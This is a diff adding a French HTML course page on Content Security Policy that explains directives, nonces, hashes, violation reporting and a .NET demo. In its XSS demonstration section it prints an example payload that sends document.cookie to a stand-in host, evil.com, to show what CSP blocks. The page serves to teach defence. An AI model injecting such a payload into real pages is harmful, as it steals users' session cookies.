@@ -1,0 +1,958 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Content Security Policy (CSP) - Cours Cybersecurite</title>
+    <style>
+        :root {
+            --bg: #0f1117;
+            --surface: #1a1d27;
+            --surface-2: #242736;
+            --accent: #6c63ff;
+            --accent-light: #8b83ff;
+            --danger: #ff4757;
+            --success: #2ed573;
+            --warning: #ffa502;
+            --text: #e4e6eb;
+            --text-muted: #8b8fa3;
+            --border: #2e3142;
+            --code-bg: #12131a;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            line-height: 1.7;
+        }
+
+        /* Navigation */
+        nav {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 260px;
+            height: 100vh;
+            background: var(--surface);
+            border-right: 1px solid var(--border);
+            padding: 2rem 0;
+            overflow-y: auto;
+            z-index: 100;
+        }
+
+        nav .logo {
+            padding: 0 1.5rem 1.5rem;
+            border-bottom: 1px solid var(--border);
+            margin-bottom: 1rem;
+        }
+
+        nav .logo h2 {
+            font-size: 1.1rem;
+            color: var(--accent-light);
+            font-weight: 600;
+        }
+
+        nav .logo span {
+            font-size: 0.75rem;
+            color: var(--text-muted);
+        }
+
+        nav a {
+            display: block;
+            padding: 0.6rem 1.5rem;
+            color: var(--text-muted);
+            text-decoration: none;
+            font-size: 0.9rem;
+            transition: all 0.2s;
+            border-left: 3px solid transparent;
+        }
+
+        nav a:hover, nav a.active {
+            color: var(--text);
+            background: var(--surface-2);
+            border-left-color: var(--accent);
+        }
+
+        /* Main content */
+        main {
+            margin-left: 260px;
+            max-width: 900px;
+            padding: 3rem 4rem;
+        }
+
+        h1 {
+            font-size: 2.5rem;
+            margin-bottom: 0.5rem;
+            color: #fff;
+        }
+
+        h1 .shield { font-size: 2.2rem; margin-right: 0.5rem; }
+
+        .subtitle {
+            color: var(--text-muted);
+            font-size: 1.1rem;
+            margin-bottom: 3rem;
+        }
+
+        h2 {
+            font-size: 1.6rem;
+            margin-top: 3rem;
+            margin-bottom: 1rem;
+            padding-bottom: 0.5rem;
+            border-bottom: 2px solid var(--accent);
+            color: #fff;
+        }
+
+        h3 {
+            font-size: 1.2rem;
+            margin-top: 2rem;
+            margin-bottom: 0.7rem;
+            color: var(--accent-light);
+        }
+
+        p { margin-bottom: 1rem; }
+
+        /* Alert boxes */
+        .alert {
+            padding: 1rem 1.2rem;
+            border-radius: 8px;
+            margin: 1.5rem 0;
+            border-left: 4px solid;
+        }
+
+        .alert-danger {
+            background: rgba(255, 71, 87, 0.1);
+            border-color: var(--danger);
+        }
+
+        .alert-success {
+            background: rgba(46, 213, 115, 0.1);
+            border-color: var(--success);
+        }
+
+        .alert-warning {
+            background: rgba(255, 165, 2, 0.1);
+            border-color: var(--warning);
+        }
+
+        .alert-info {
+            background: rgba(108, 99, 255, 0.1);
+            border-color: var(--accent);
+        }
+
+        .alert strong {
+            display: block;
+            margin-bottom: 0.3rem;
+        }
+
+        /* Code blocks */
+        pre {
+            background: var(--code-bg);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 1.2rem;
+            overflow-x: auto;
+            margin: 1rem 0 1.5rem;
+            font-size: 0.88rem;
+        }
+
+        code {
+            font-family: 'Cascadia Code', 'Fira Code', 'Consolas', monospace;
+            color: var(--accent-light);
+        }
+
+        pre code { color: var(--text); }
+
+        .kw { color: #c678dd; }
+        .str { color: #98c379; }
+        .cmt { color: #5c6370; font-style: italic; }
+        .fn { color: #61afef; }
+        .val { color: #d19a66; }
+
+        /* Tables */
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 1.5rem 0;
+            font-size: 0.92rem;
+        }
+
+        th, td {
+            padding: 0.8rem 1rem;
+            text-align: left;
+            border: 1px solid var(--border);
+        }
+
+        th {
+            background: var(--surface-2);
+            color: var(--accent-light);
+            font-weight: 600;
+        }
+
+        tr:hover td { background: var(--surface); }
+
+        /* Diagram / visual blocks */
+        .diagram {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 2rem;
+            margin: 2rem 0;
+            text-align: center;
+        }
+
+        .flow {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+            flex-wrap: wrap;
+        }
+
+        .flow-box {
+            background: var(--surface-2);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 0.8rem 1.2rem;
+            font-size: 0.9rem;
+            min-width: 120px;
+        }
+
+        .flow-box.browser { border-color: var(--accent); }
+        .flow-box.server { border-color: var(--success); }
+        .flow-box.blocked { border-color: var(--danger); background: rgba(255,71,87,0.1); }
+
+        .flow-arrow {
+            font-size: 1.5rem;
+            color: var(--text-muted);
+        }
+
+        /* Interactive demo */
+        .demo-area {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 1.5rem;
+            margin: 1.5rem 0;
+        }
+
+        .demo-area h4 {
+            color: var(--accent-light);
+            margin-bottom: 1rem;
+            font-size: 1rem;
+        }
+
+        .demo-tabs {
+            display: flex;
+            gap: 0.5rem;
+            margin-bottom: 1rem;
+        }
+
+        .demo-tab {
+            padding: 0.5rem 1rem;
+            background: var(--surface-2);
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            color: var(--text-muted);
+            cursor: pointer;
+            font-size: 0.85rem;
+            transition: all 0.2s;
+        }
+
+        .demo-tab:hover, .demo-tab.active {
+            background: var(--accent);
+            color: #fff;
+            border-color: var(--accent);
+        }
+
+        .demo-output {
+            background: var(--code-bg);
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            padding: 1rem;
+            min-height: 80px;
+            font-family: 'Cascadia Code', monospace;
+            font-size: 0.85rem;
+        }
+
+        .console-line { margin: 0.2rem 0; }
+        .console-error { color: var(--danger); }
+        .console-ok { color: var(--success); }
+        .console-warn { color: var(--warning); }
+
+        /* Comparison cards */
+        .comparison {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 1.5rem;
+            margin: 1.5rem 0;
+        }
+
+        .card {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 1.5rem;
+        }
+
+        .card h4 {
+            margin-bottom: 0.8rem;
+            font-size: 1rem;
+        }
+
+        .card.bad { border-top: 3px solid var(--danger); }
+        .card.bad h4 { color: var(--danger); }
+        .card.good { border-top: 3px solid var(--success); }
+        .card.good h4 { color: var(--success); }
+
+        /* Lists */
+        ul, ol {
+            margin: 0.8rem 0 1.2rem 1.5rem;
+        }
+
+        li { margin-bottom: 0.4rem; }
+
+        /* Badge */
+        .badge {
+            display: inline-block;
+            padding: 0.15rem 0.5rem;
+            border-radius: 4px;
+            font-size: 0.75rem;
+            font-weight: 600;
+            text-transform: uppercase;
+        }
+
+        .badge-danger { background: rgba(255,71,87,0.2); color: var(--danger); }
+        .badge-success { background: rgba(46,213,115,0.2); color: var(--success); }
+        .badge-warning { background: rgba(255,165,2,0.2); color: var(--warning); }
+
+        /* Footer */
+        footer {
+            margin-top: 4rem;
+            padding: 2rem 0;
+            border-top: 1px solid var(--border);
+            color: var(--text-muted);
+            font-size: 0.85rem;
+            text-align: center;
+        }
+
+        /* Responsive */
+        @media (max-width: 900px) {
+            nav { display: none; }
+            main { margin-left: 0; padding: 2rem 1.5rem; }
+            .comparison { grid-template-columns: 1fr; }
+        }
+    </style>
+</head>
+<body>
+
+<nav>
+    <div class="logo">
+        <h2>CSP Guide</h2>
+        <span>Programmation Securisee</span>
+    </div>
+    <a href="#intro" class="active">Introduction</a>
+    <a href="#pourquoi">Pourquoi CSP ?</a>
+    <a href="#fonctionnement">Fonctionnement</a>
+    <a href="#directives">Directives principales</a>
+    <a href="#sources">Valeurs de source</a>
+    <a href="#exemples">Exemples concrets</a>
+    <a href="#xss">CSP vs XSS</a>
+    <a href="#nonce">Nonces et Hashes</a>
+    <a href="#report">Reporting</a>
+    <a href="#dotnet">MVP .NET</a>
+    <a href="#erreurs">Erreurs courantes</a>
+    <a href="#outils">Outils</a>
+    <a href="#ressources">Ressources</a>
+</nav>
+
+<main>
+    <!-- ==================== INTRO ==================== -->
+    <section id="intro">
+        <h1>Content Security Policy</h1>
+        <p class="subtitle">Comprendre et implementer CSP pour securiser les applications web</p>
+
+        <div class="alert alert-info">
+            <strong>Objectif du cours</strong>
+            A la fin de cette documentation, vous serez capable de comprendre le role de CSP,
+            rediger des politiques adaptees, et implementer CSP dans une application .NET.
+        </div>
+
+        <p>
+            <strong>Content Security Policy (CSP)</strong> est un mecanisme de securite implemente par les navigateurs
+            web qui permet aux developpeurs de controler quelles ressources (scripts, styles, images, etc.)
+            peuvent etre chargees et executees sur leurs pages.
+        </p>
+        <p>
+            CSP fonctionne via un <strong>en-tete HTTP</strong> (ou une balise <code>&lt;meta&gt;</code>) qui declare
+            une liste blanche de sources autorisees. Toute ressource ne correspondant pas a cette politique
+            est <strong>bloquee par le navigateur</strong>.
+        </p>
+
+        <pre><code><span class="cmt">// Exemple d'en-tete CSP</span>
+Content-Security-Policy: <span class="str">default-src 'self'; script-src 'self' https://cdn.example.com</span></code></pre>
+    </section>
+
+    <!-- ==================== POURQUOI ==================== -->
+    <section id="pourquoi">
+        <h2>Pourquoi utiliser CSP ?</h2>
+
+        <h3>Le probleme : les attaques par injection</h3>
+        <p>
+            Sans CSP, un navigateur execute aveuglément tout code present dans la page HTML.
+            Si un attaquant parvient a injecter du contenu (via XSS, injection HTML, etc.),
+            le navigateur ne fait aucune difference entre le code legitime et le code malveillant.
+        </p>
+
+        <div class="comparison">
+            <div class="card bad">
+                <h4>Sans CSP</h4>
+                <ul>
+                    <li>Le navigateur execute tout script present dans le HTML</li>
+                    <li>Les scripts inline malveillants s'executent</li>
+                    <li>Les ressources externes non controlees se chargent</li>
+                    <li>Vol de cookies, redirection, keylogging possibles</li>
+                </ul>
+            </div>
+            <div class="card good">
+                <h4>Avec CSP</h4>
+                <ul>
+                    <li>Seules les sources autorisees sont chargees</li>
+                    <li>Les scripts inline sont bloques par defaut</li>
+                    <li>Les connexions non prevues sont refusees</li>
+                    <li>Le navigateur rapporte les violations</li>
+                </ul>
+            </div>
+        </div>
+
+        <h3>CSP comme couche de defense en profondeur</h3>
+        <div class="alert alert-warning">
+            <strong>Attention</strong>
+            CSP n'est <em>pas</em> un substitut a la validation et l'encodage des entrees.
+            C'est une <strong>couche supplementaire</strong> de defense (defense in depth).
+            Meme avec CSP, il faut continuer a encoder les sorties et valider les entrees.
+        </div>
+    </section>
+
+    <!-- ==================== FONCTIONNEMENT ==================== -->
+    <section id="fonctionnement">
+        <h2>Comment fonctionne CSP ?</h2>
+
+        <div class="diagram">
+            <p style="margin-bottom:1.5rem; color: var(--text-muted);">Cycle de vie d'une requete avec CSP</p>
+            <div class="flow">
+                <div class="flow-box browser">Navigateur<br><small>demande la page</small></div>
+                <div class="flow-arrow">&rarr;</div>
+                <div class="flow-box server">Serveur<br><small>repond avec en-tete CSP</small></div>
+                <div class="flow-arrow">&rarr;</div>
+                <div class="flow-box browser">Navigateur<br><small>parse la politique CSP</small></div>
+            </div>
+            <br>
+            <div class="flow">
+                <div class="flow-box browser">Ressource demandee<br><small>script, style, image...</small></div>
+                <div class="flow-arrow">&rarr;</div>
+                <div class="flow-box server">Verification CSP<br><small>source autorisee ?</small></div>
+                <div class="flow-arrow">&rarr;</div>
+                <div class="flow-box" style="border-color: var(--success);">Autorisee<br><small>chargement OK</small></div>
+            </div>
+            <br>
+            <div class="flow">
+                <div class="flow-box browser">Ressource inconnue<br><small>script injecte</small></div>
+                <div class="flow-arrow">&rarr;</div>
+                <div class="flow-box server">Verification CSP<br><small>source autorisee ?</small></div>
+                <div class="flow-arrow">&rarr;</div>
+                <div class="flow-box blocked">Bloquee<br><small>violation CSP</small></div>
+            </div>
+        </div>
+
+        <h3>Methodes de declaration</h3>
+
+        <p><strong>1. En-tete HTTP (recommande) :</strong></p>
+        <pre><code>Content-Security-Policy: default-src 'self'</code></pre>
+
+        <p><strong>2. Balise meta (fallback) :</strong></p>
+        <pre><code>&lt;<span class="kw">meta</span> <span class="fn">http-equiv</span>=<span class="str">"Content-Security-Policy"</span>
+      <span class="fn">content</span>=<span class="str">"default-src 'self'"</span>&gt;</code></pre>
+
+        <div class="alert alert-info">
+            <strong>Note</strong>
+            L'en-tete HTTP est prefere car il couvre toutes les ressources, y compris celles
+            chargees avant le parsing du HTML. La balise <code>&lt;meta&gt;</code> ne supporte pas
+            toutes les directives (ex: <code>frame-ancestors</code>, <code>report-uri</code>).
+        </div>
+    </section>
+
+    <!-- ==================== DIRECTIVES ==================== -->
+    <section id="directives">
+        <h2>Directives principales</h2>
+
+        <table>
+            <thead>
+                <tr>
+                    <th>Directive</th>
+                    <th>Controle</th>
+                    <th>Exemple</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td><code>default-src</code></td>
+                    <td>Fallback pour toutes les directives non specifiees</td>
+                    <td><code>default-src 'self'</code></td>
+                </tr>
+                <tr>
+                    <td><code>script-src</code></td>
+                    <td>Sources autorisees pour JavaScript</td>
+                    <td><code>script-src 'self' 'nonce-abc123'</code></td>
+                </tr>
+                <tr>
+                    <td><code>style-src</code></td>
+                    <td>Sources autorisees pour CSS</td>
+                    <td><code>style-src 'self' 'unsafe-inline'</code></td>
+                </tr>
+                <tr>
+                    <td><code>img-src</code></td>
+                    <td>Sources autorisees pour les images</td>
+                    <td><code>img-src 'self' data: https:</code></td>
+                </tr>
+                <tr>
+                    <td><code>connect-src</code></td>
+                    <td>URLs autorisees pour fetch, XHR, WebSocket</td>
+                    <td><code>connect-src 'self' https://api.example.com</code></td>
+                </tr>
+                <tr>
+                    <td><code>font-src</code></td>
+                    <td>Sources autorisees pour les polices</td>
+                    <td><code>font-src 'self' https://fonts.gstatic.com</code></td>
+                </tr>
+                <tr>
+                    <td><code>frame-src</code></td>
+                    <td>Sources autorisees pour les iframes</td>
+                    <td><code>frame-src 'none'</code></td>
+                </tr>
+                <tr>
+                    <td><code>frame-ancestors</code></td>
+                    <td>Qui peut embarquer cette page en iframe</td>
+                    <td><code>frame-ancestors 'self'</code></td>
+                </tr>
+                <tr>
+                    <td><code>object-src</code></td>
+                    <td>Sources pour &lt;object&gt;, &lt;embed&gt;, &lt;applet&gt;</td>
+                    <td><code>object-src 'none'</code></td>
+                </tr>
+                <tr>
+                    <td><code>base-uri</code></td>
+                    <td>URLs autorisees pour &lt;base&gt;</td>
+                    <td><code>base-uri 'self'</code></td>
+                </tr>
+                <tr>
+                    <td><code>form-action</code></td>
+                    <td>URLs cibles autorisees pour les formulaires</td>
+                    <td><code>form-action 'self'</code></td>
+                </tr>
+                <tr>
+                    <td><code>upgrade-insecure-requests</code></td>
+                    <td>Force HTTPS pour toutes les requetes</td>
+                    <td><code>upgrade-insecure-requests</code></td>
+                </tr>
+            </tbody>
+        </table>
+    </section>
+
+    <!-- ==================== SOURCES ==================== -->
+    <section id="sources">
+        <h2>Valeurs de source</h2>
+
+        <table>
+            <thead>
+                <tr>
+                    <th>Valeur</th>
+                    <th>Signification</th>
+                    <th>Securite</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td><code>'self'</code></td>
+                    <td>Meme origine (protocole + domaine + port)</td>
+                    <td><span class="badge badge-success">SURE</span></td>
+                </tr>
+                <tr>
+                    <td><code>'none'</code></td>
+                    <td>Aucune source autorisee</td>
+                    <td><span class="badge badge-success">SURE</span></td>
+                </tr>
+                <tr>
+                    <td><code>https://example.com</code></td>
+                    <td>Domaine specifique</td>
+                    <td><span class="badge badge-success">SURE</span></td>
+                </tr>
+                <tr>
+                    <td><code>https:</code></td>
+                    <td>Tout domaine en HTTPS</td>
+                    <td><span class="badge badge-warning">MOYEN</span></td>
+                </tr>
+                <tr>
+                    <td><code>'nonce-&lt;base64&gt;'</code></td>
+                    <td>Script avec attribut nonce correspondant</td>
+                    <td><span class="badge badge-success">SURE</span></td>
+                </tr>
+                <tr>
+                    <td><code>'sha256-&lt;hash&gt;'</code></td>
+                    <td>Script dont le contenu correspond au hash</td>
+                    <td><span class="badge badge-success">SURE</span></td>
+                </tr>
+                <tr>
+                    <td><code>'strict-dynamic'</code></td>
+                    <td>Fait confiance aux scripts charges par un script autorise</td>
+                    <td><span class="badge badge-success">SURE</span></td>
+                </tr>
+                <tr>
+                    <td><code>'unsafe-inline'</code></td>
+                    <td>Autorise les scripts/styles inline</td>
+                    <td><span class="badge badge-danger">DANGER</span></td>
+                </tr>
+                <tr>
+                    <td><code>'unsafe-eval'</code></td>
+                    <td>Autorise eval(), new Function(), etc.</td>
+                    <td><span class="badge badge-danger">DANGER</span></td>
+                </tr>
+                <tr>
+                    <td><code>*</code></td>
+                    <td>Toute source (wildcard)</td>
+                    <td><span class="badge badge-danger">DANGER</span></td>
+                </tr>
+            </tbody>
+        </table>
+
+        <div class="alert alert-danger">
+            <strong>A eviter absolument</strong>
+            <code>'unsafe-inline'</code> et <code>'unsafe-eval'</code> annulent la protection CSP
+            contre les XSS. Utilisez des <strong>nonces</strong> ou des <strong>hashes</strong> a la place.
+        </div>
+    </section>
+
+    <!-- ==================== EXEMPLES ==================== -->
+    <section id="exemples">
+        <h2>Exemples concrets de politiques</h2>
+
+        <h3>Politique stricte (recommandee)</h3>
+        <pre><code>Content-Security-Policy:
+  <span class="str">default-src</span> <span class="val">'none'</span>;
+  <span class="str">script-src</span> <span class="val">'self' 'nonce-r4nd0m'</span>;
+  <span class="str">style-src</span> <span class="val">'self'</span>;
+  <span class="str">img-src</span> <span class="val">'self'</span>;
+  <span class="str">font-src</span> <span class="val">'self'</span>;
+  <span class="str">connect-src</span> <span class="val">'self'</span>;
+  <span class="str">frame-ancestors</span> <span class="val">'none'</span>;
+  <span class="str">base-uri</span> <span class="val">'self'</span>;
+  <span class="str">form-action</span> <span class="val">'self'</span>;
+  <span class="str">object-src</span> <span class="val">'none'</span></code></pre>
+
+        <h3>Politique pour site avec CDN</h3>
+        <pre><code>Content-Security-Policy:
+  <span class="str">default-src</span> <span class="val">'self'</span>;
+  <span class="str">script-src</span> <span class="val">'self' https://cdn.jsdelivr.net</span>;
+  <span class="str">style-src</span> <span class="val">'self' https://cdn.jsdelivr.net</span>;
+  <span class="str">img-src</span> <span class="val">'self' data: https:</span>;
+  <span class="str">font-src</span> <span class="val">'self' https://fonts.gstatic.com</span></code></pre>
+
+        <h3>Politique permissive (a eviter en production)</h3>
+        <pre><code><span class="cmt">// MAUVAIS EXEMPLE - ne fait quasiment rien</span>
+Content-Security-Policy:
+  <span class="str">default-src</span> <span class="val">* 'unsafe-inline' 'unsafe-eval'</span></code></pre>
+    </section>
+
+    <!-- ==================== XSS ==================== -->
+    <section id="xss">
+        <h2>CSP vs XSS : demonstration</h2>
+
+        <p>Voici un scenario concret montrant comment CSP bloque une attaque XSS :</p>
+
+        <h3>Scenario : champ de commentaire vulnerable</h3>
+
+        <div class="demo-area">
+            <h4>Simulation interactive</h4>
+            <div class="demo-tabs">
+                <div class="demo-tab active" onclick="showDemo('sans')">Sans CSP</div>
+                <div class="demo-tab" onclick="showDemo('avec')">Avec CSP</div>
+            </div>
+            <p style="font-size:0.9rem; color: var(--text-muted); margin-bottom:1rem;">
+                Un utilisateur soumet ce commentaire malveillant :
+            </p>
+            <pre style="margin-bottom:1rem;"><code>&lt;img src=x onerror="document.location='https://evil.com/steal?c='+document.cookie"&gt;</code></pre>
+            <div id="demo-output" class="demo-output">
+                <div class="console-line console-error">[Browser] Executing inline event handler...</div>
+                <div class="console-line console-error">[Browser] Redirecting to https://evil.com/steal?c=session=abc123</div>
+                <div class="console-line console-error">[Attack] Cookie vole avec succes !</div>
+            </div>
+        </div>
+
+        <h3>Types de XSS bloques par CSP</h3>
+        <table>
+            <thead>
+                <tr>
+                    <th>Type de XSS</th>
+                    <th>Methode</th>
+                    <th>CSP bloque ?</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td>Reflected XSS</td>
+                    <td>Script inline injecte via URL</td>
+                    <td><span class="badge badge-success">OUI</span> (si pas de unsafe-inline)</td>
+                </tr>
+                <tr>
+                    <td>Stored XSS</td>
+                    <td>Script inline stocke en BDD</td>
+                    <td><span class="badge badge-success">OUI</span> (si pas de unsafe-inline)</td>
+                </tr>
+                <tr>
+                    <td>DOM-based XSS</td>
+                    <td>Manipulation DOM via eval()</td>
+                    <td><span class="badge badge-success">OUI</span> (si pas de unsafe-eval)</td>
+                </tr>
+                <tr>
+                    <td>Script externe</td>
+                    <td>Chargement depuis domaine malveillant</td>
+                    <td><span class="badge badge-success">OUI</span> (domaine non autorise)</td>
+                </tr>
+            </tbody>
+        </table>
+    </section>
+
+    <!-- ==================== NONCE ==================== -->
+    <section id="nonce">
+        <h2>Nonces et Hashes</h2>
+
+        <p>
+            Les <strong>nonces</strong> et <strong>hashes</strong> permettent d'autoriser des scripts inline
+            specifiques sans ouvrir la porte a <code>'unsafe-inline'</code>.
+        </p>
+
+        <h3>Nonce (Number used ONCE)</h3>
+        <p>Un nonce est une valeur aleatoire unique generee a chaque requete :</p>
+
+        <pre><code><span class="cmt">// En-tete CSP</span>
+Content-Security-Policy: script-src <span class="str">'nonce-abc123XYZ'</span>
+
+<span class="cmt">// Dans le HTML - ce script s'execute</span>
+&lt;<span class="kw">script</span> <span class="fn">nonce</span>=<span class="str">"abc123XYZ"</span>&gt;
+  console.log(<span class="str">"Autorise !"</span>);
+&lt;/<span class="kw">script</span>&gt;
+
+<span class="cmt">// Ce script est BLOQUE (pas de nonce)</span>
+&lt;<span class="kw">script</span>&gt;
+  document.location = <span class="str">"https://evil.com"</span>;
+&lt;/<span class="kw">script</span>&gt;</code></pre>
+
+        <div class="alert alert-warning">
+            <strong>Regle critique</strong>
+            Le nonce <strong>doit changer a chaque requete</strong>. Un nonce statique est inutile car
+            l'attaquant pourrait l'inclure dans son injection.
+            Utilisez un generateur cryptographiquement sur (ex: <code>RandomNumberGenerator</code> en .NET).
+        </div>
+
+        <h3>Hash</h3>
+        <p>Alternative au nonce : autoriser un script par le hash de son contenu :</p>
+
+        <pre><code><span class="cmt">// En-tete CSP avec hash SHA-256</span>
+Content-Security-Policy: script-src <span class="str">'sha256-B2yPHKaXnvFWtRChIbabYmUBFZdVfKKXHbWtWidDVF8='</span>
+
+<span class="cmt">// Le script dont le hash SHA-256 correspond</span>
+&lt;<span class="kw">script</span>&gt;alert(<span class="str">'Hello'</span>);&lt;/<span class="kw">script</span>&gt;</code></pre>
+    </section>
+
+    <!-- ==================== REPORT ==================== -->
+    <section id="report">
+        <h2>Reporting des violations</h2>
+
+        <p>CSP peut rapporter les violations a un endpoint de votre choix, ce qui est utile pour :</p>
+        <ul>
+            <li>Detecter des tentatives d'attaque</li>
+            <li>Identifier des ressources bloquees par erreur</li>
+            <li>Tester une politique avant de la deployer (mode report-only)</li>
+        </ul>
+
+        <h3>Mode Report-Only</h3>
+        <pre><code><span class="cmt">// Ne bloque rien, rapporte seulement</span>
+Content-Security-Policy-<span class="kw">Report-Only</span>: default-src 'self'; report-uri /csp-report</code></pre>
+
+        <h3>Exemple de rapport JSON</h3>
+        <pre><code>{
+  <span class="str">"csp-report"</span>: {
+    <span class="str">"document-uri"</span>: <span class="str">"https://example.com/page"</span>,
+    <span class="str">"violated-directive"</span>: <span class="str">"script-src 'self'"</span>,
+    <span class="str">"blocked-uri"</span>: <span class="str">"https://evil.com/malware.js"</span>,
+    <span class="str">"original-policy"</span>: <span class="str">"default-src 'self'; script-src 'self'"</span>,
+    <span class="str">"disposition"</span>: <span class="str">"enforce"</span>,
+    <span class="str">"status-code"</span>: <span class="val">200</span>
+  }
+}</code></pre>
+
+        <h3>Strategie de deploiement recommandee</h3>
+        <ol>
+            <li><strong>Report-Only</strong> : deployer en mode observation pendant 1-2 semaines</li>
+            <li><strong>Analyser</strong> : corriger les faux positifs identifies dans les rapports</li>
+            <li><strong>Enforce</strong> : passer en mode actif une fois la politique validee</li>
+            <li><strong>Surveiller</strong> : continuer a collecter les rapports en production</li>
+        </ol>
+    </section>
+
+    <!-- ==================== .NET MVP ==================== -->
+    <section id="dotnet">
+        <h2>MVP .NET : Implementation CSP</h2>
+
+        <p>
+            Le projet <code>CspDemoApp</code> accompagne cette documentation.
+            C'est une application ASP.NET Core minimale qui demontre CSP en action.
+        </p>
+
+        <h3>Structure du MVP</h3>
+        <pre><code>CspDemoApp/
+  Program.cs              <span class="cmt">// Point d'entree + middleware CSP</span>
+  Middleware/
+    CspMiddleware.cs      <span class="cmt">// Middleware CSP configurable</span>
+  Pages/
+    Index.html            <span class="cmt">// Page de demo avec scenarios XSS</span>
+  CspDemoApp.csproj       <span class="cmt">// Fichier projet</span></code></pre>
+
+        <h3>Points cles de l'implementation</h3>
+        <ul>
+            <li>Nonce genere dynamiquement a chaque requete</li>
+            <li>Middleware dedie pour ajouter les en-tetes CSP</li>
+            <li>Page de demo avec XSS simule (script inline bloque)</li>
+            <li>Endpoint de rapport CSP pour visualiser les violations</li>
+            <li>Basculement Report-Only / Enforce via query string</li>
+        </ul>
+
+        <h3>Lancer le MVP</h3>
+        <pre><code><span class="cmt"># Dans le dossier CspDemoApp</span>
+dotnet run
+
+<span class="cmt"># Ouvrir dans le navigateur</span>
+https://localhost:5001</code></pre>
+    </section>
+
+    <!-- ==================== ERREURS ==================== -->
+    <section id="erreurs">
+        <h2>Erreurs courantes</h2>
+
+        <div class="alert alert-danger">
+            <strong>1. Utiliser 'unsafe-inline' pour "faire marcher" le site</strong>
+            C'est la premiere erreur des debutants. Utilisez des nonces ou externalisez vos scripts.
+        </div>
+
+        <div class="alert alert-danger">
+            <strong>2. Oublier default-src</strong>
+            Sans <code>default-src</code>, les directives non specifiees n'ont aucune restriction.
+            Toujours commencer par <code>default-src 'none'</code> ou <code>default-src 'self'</code>.
+        </div>
+
+        <div class="alert alert-danger">
+            <strong>3. Politique trop permissive avec wildcard</strong>
+            <code>script-src *</code> autorise n'importe quel domaine a executer du JavaScript.
+            Privilegiez la liste blanche de domaines specifiques.
+        </div>
+
+        <div class="alert alert-warning">
+            <strong>4. Nonce statique ou previsible</strong>
+            Le nonce doit etre cryptographiquement aleatoire et change a chaque requete.
+            Un nonce code en dur est equivalent a <code>'unsafe-inline'</code>.
+        </div>
+
+        <div class="alert alert-warning">
+            <strong>5. Ignorer les rapports de violation</strong>
+            Les rapports CSP sont une mine d'or pour detecter les attaques et les erreurs de configuration.
+        </div>
+    </section>
+
+    <!-- ==================== OUTILS ==================== -->
+    <section id="outils">
+        <h2>Outils utiles</h2>
+
+        <table>
+            <thead>
+                <tr>
+                    <th>Outil</th>
+                    <th>Description</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td><strong>Chrome DevTools &gt; Console</strong></td>
+                    <td>Affiche les violations CSP en temps reel</td>
+                </tr>
+                <tr>
+                    <td><strong>Chrome DevTools &gt; Network</strong></td>
+                    <td>Voir les en-tetes CSP dans la reponse</td>
+                </tr>
+                <tr>
+                    <td><strong>csp-evaluator.withgoogle.com</strong></td>
+                    <td>Analyse et note votre politique CSP</td>
+                </tr>
+                <tr>
+                    <td><strong>report-uri.com</strong></td>
+                    <td>Service de collecte de rapports CSP</td>
+                </tr>
+                <tr>
+                    <td><strong>securityheaders.com</strong></td>
+                    <td>Scan des en-tetes de securite d'un site</td>
+                </tr>
+                <tr>
+                    <td><strong>Mozilla Observatory</strong></td>
+                    <td>Audit de securite web complet</td>
+                </tr>
+            </tbody>
+        </table>
+    </section>
+
+    <!-- ==================== RESSOURCES ==================== -->
+    <section id="ressources">
+        <h2>Ressources</h2>
+
+        <ul>
+            <li><strong>MDN Web Docs</strong> - Content Security Policy (reference complete)</li>
+            <li><strong>OWASP</strong> - CSP Cheat Sheet</li>
+            <li><strong>W3C</strong> - CSP Level 3 Specification</li>
+            <li><strong>Google Web Fundamentals</strong> - CSP Guide</li>
+            <li><strong>Microsoft Docs</strong> - Content Security Policy dans ASP.NET Core</li>
+        </ul>
+    </section>
+
+    <footer>
+        Condorcet 2026 - BAC Cyber Securite - Programmation Securisee
+    </footer>
+</main>
+
+<script>
+function showDemo(type) {
+    const output = document.getElementById('demo-output');
+    const tabs = document.querySelectorAll('.demo-tab');
+    tabs.forEach(t => t.classList.remove('active'));
+
+    if (type === 'sans') {
+        tabs[0].classList.add('active');
+        output.innerHTML = `
+            <div class="console-line console-error">[Browser] Executing inline event handler...</div>
+            <div class="console-line console-error">[Browser] Redirecting to https://evil.com/steal?c=session=abc123</div>
+            <div class="console-line console-error">[Attack] Cookie vole avec succes !</div>
+        `;
+    } else {
+        tabs[1].classList.add('active');
+        output.innerHTML = `
+            <div class="console-line console-warn">[CSP] Refused to execute inline event handler because it violates the following Content Security Policy directive: "script-src 'self' 'nonce-r4nd0m'"</div>
+            <div class="console-line console-ok">[Browser] Inline script BLOQUE.</div>
+            <div class="console-line console-ok">[CSP] Violation reported to /csp-report</div>
+            <div class="console-line console-ok">[Security] Cookie protege. Aucune fuite.</div>
+        `;
+    }
+}
+</script>
+
+</body>
+</html>
